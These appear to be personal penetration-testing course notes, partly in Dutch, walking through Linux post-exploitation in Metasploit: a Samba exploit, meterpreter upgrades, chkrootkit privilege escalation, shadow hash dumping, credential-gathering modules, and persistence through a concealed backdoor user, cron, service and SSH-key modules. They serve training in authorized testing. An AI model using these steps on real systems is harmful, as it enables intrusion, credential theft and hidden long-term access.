
![[Pasted image 20230830164328.png]] 

##### Upgrade shell session to meterpreter session 
1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability: 
		 - `search samba`  -->  `use exploit/Linux/samba/is_known_pipename `
		 - `pwd` 
		 - `put session in the background` 
6) upgrade shell session to meterpreter session: `sessions -u 1` 
7) sessions 2 (this is now your meterpreter session )
 `

##### Enumerate the system: 
1)  `/bin/bash -i

- `cat /etc/passwd`:
    - Gather information about user accounts, helping to identify potential targets or user management weaknesses.
- `groups root`:
    - Determine the groups to which the "root" user belongs, revealing privileges and access levels for understanding vulnerabilities.
- `cat /etc/*issue*`:
    - Identify the OS and version, aiding in selecting specific exploits or attack vectors tailored to the detected OS.
- `ip a s`:
    - Understand network interfaces and configurations, identifying entry points or routes for attacks and subnet information for network pivoting.
- `netstat -antp`:
    - View active network connections and associated processes, detecting suspicious or unauthorized connections indicating security issues.
- `ps aux`:
    - See active processes, potentially identifying vulnerabilities or unauthorized processes for exploitation or lateral movement.
- `env`:
    - Display environment variables, helping to understand session configurations, privileges, and identifying sensitive information affecting application behavior. Useful for identifying potential attack surfaces.


##### post exploitation modules 
- Enumerate configuration files on linux system: 
	- `search enum_configs` 
		- `use post/linux/gather/enum_configs` 
		- set session to meterpreter session on target 
		- `loot` 
		- `cat [path] ` (identify the shells that are on the system)

- gather environment settings 
	- `use post/multi/gather/env` 
	- `session` (set session to meterpreter session)
	- `run` 

- gather network information 
	- `use post/linux/gather/enum_network` 
	- `session` (set session to meterpreter session)
	- `run` 
	- `loot` (get al the information)
		- enumerate  information:  copy file path and: `cath path` `

- check protection systems on linux system (security features) 
	- `use post/linux/gather/enum_protection` 
		- set session to meterpreter session 
	- notes: here will al important notes are stored 

- system enumeration 
	- `use post/linux/gather/enum_system`
	- see installed packages: `loot` -> `cat [path]`


- check if target is a vm or container 
	- `search checkcointainer `
		- `use post/linux/gather/checkcontainer`  (if you are in a container- you need container-breakout to get access to host system that is hosting the container)
	- `search checkvm` 
		- `use post/linux/gather/checkvm` 

- enumerate users history
	- `search enum_users_history` 
		- `use post/linux/gather/enum_users_history`  (stores logs of commands)
		- `loot`  -> `cat` content file 

- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec
  
  
### Linux Privilege escalation - Exploiting A vulnerable program 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability:  
	1) `search ssh_login`
	2) `use auxiliary/scanner/ssh/ssh_login `
	3) use ssh credentials 
	4) /bin/bash -i 
6) upgrade session 1 (shel) to meterpreter session: `sessions -u 1` 
7) open shell session on meterpreter 
8) user enumeration: `cat /etc/passwd `
9) find a vulnerable process so we can elevate our privileges: `ps aux` 
10) look at the root user: to find out more about binary/script: `cat [command]`
![[Pasted image 20230830210745.png]]
11) Find out where the chkrootkit script is stored: command -v chkrootkit
13) check version of chrootkit: ` [path] chrootkit -V `
go into meterpreter and exploit chkrootkit (exploit/unix/local/chrootkit) 

![[Pasted image 20230830215050.png]]

Step 6: Upgrade Session 1 (shell) to Meterpreter Session
- `sessions -u 1`
- This command upgrades Session 1 to a Meterpreter session, providing more advanced capabilities.
Step 7: Open a Shell Session on Meterpreter**
- You can use the `shell` command in Meterpreter to open a shell session.
Step 8: User Enumeration**
- `cat /etc/passwd`
- This command lists user accounts on the system.
Step 9: Find a Vulnerable Process for Privilege Escalation**
- `ps aux`
- This command lists running processes. To find a vulnerable process for privilege escalation, additional steps are usually needed, such as checking for known vulnerabilities in specific processes.
Step 10: Examine the Root User for More Information**
- `cat [command]`
- Replace `[command]` with the name of the binary or script you want to examine. This command allows you to view the content of a file.
Step 11: Find the Location of the chkrootkit Script**
- `command -v chkrootkit`
- This command helps you find the path to the `chkrootkit` script.
Step 12: Check the Version of chkrootkit**
- `[path] chkrootkit -V`
- Replace `[path]` with the actual path to the `chkrootkit` script. This command checks the version of `chkrootkit`.
Step 13: Exploit chkrootkit**
- To exploit `chkrootkit`, you would typically use Metasploit's `exploit/unix/local/chrootkit` module. The exact command may vary depending on your Metasploit setup, but you can usually do this from the Meterpreter shell.












### Dumping Hashes with Hashdump 

- we can dump linux user hashes with the hashdump post exploitation module 
- Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges 
- the hashdump module can be used to dump the user account hashes from the **/etc/shadow** file and can also be used to unshadow the hashes for password cracking with John the ripper 



1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) abuse the samba vulnerability (`samba/is_known_pipename`)
6) upgrade the session (shell -> meterpreter)
7) enumeration: sysinfo getuid 
8) search hashdump module (`use post/linux/gather/hashdump`)
9) run the module and use loot command to find the results 
	1) cat the password file  (Contains user account information, like usernames, home directories, and shells.)
	2) cat the shadow file (Stores user password hashes and account security settings)
	3) cat unshadowed file


- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
- post/linux/manage/sshkey_persistence


(lab maken)











### Establishing persistence on Linux 

- distribution release system matters in post exploitation persistence 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) set up command shell exploiting the ssh with `ssh_login` module 
6) upgrade the shell to get a meterpreter session 
7) Elevate privileges using the CHK rootkit 
	1) `use local/chkrootkit ` (set options, chkrootkit /bin/chkrootkit, sessions to meterpreter session)
		2) put shell in background 
8) Upgrade the session acquired through chk rootkit module 
	1) /bin/bash -i      whoami

##### manual: create backdoor user to give us access 
This technique can be used when target is running ssh or remote access protocol

1) `cat /etc/passwd`
- This displays the list of user accounts on the system.
2) `useradd -m usernew -s /bin/bash`
- This creates a new user named "usernew" with a home directory and `/bin/bash` as the default shell.
3) `usermod -aG root usernew`
- This grants the "usernew" user some administrative privileges by adding them to the "root" group
4) `groups usernew `
- check if the user is added to the right group 
5) `usermod -u 15 usernew `
- Modify backdoor users user id (to not give away that it is created recently )


#####  persistence module 
- `search platform: linux persistence` 

- `use exploit/linux/local/cron_persistence` 
	- set lport (check current sessions, cannot be conflicting with used ports)

-   `use exploit/linux/local/service_persistence` 
	- `set payload cmd/unix/reverse_python` 
	- set session 

- `use exploit/linux/local/sshkey_persistence`  (recommended)
	-  `Createsshfolder` `true` 
	- `set` `session` 
	- `loot` to acccess private key 

	How to use the key to get access to target system after all sessions are terminated? 
	- vim ssh_key (paste key here)
	- chmod 0400 ssh_key 
	- ssh -i ssh_key root@targetip 
	- 


Normaal gesproken loggen gebruikers in met behulp van wachtwoorden, maar SSH biedt ook een mechanisme om in te loggen met behulp van  SSH-sleutels. Deze sleutels worden meestal opgeslagen in een bestand met de naam `authorized_keys` in de thuismap van een gebruiker. Wat het doet, is inspelen op zwakke punten in het SSH-sleutelbeheerproces om een kwaadwillige SSH-sleutel in het `authorized_keys`-bestand van een doelgebruiker in te voegen, zonder dat de gebruiker hiervan op de hoogte is.
Dit betekent dat de aanvaller later, zonder een wachtwoord nodig te hebben, met SSH toegang kan krijgen tot het systeem. 

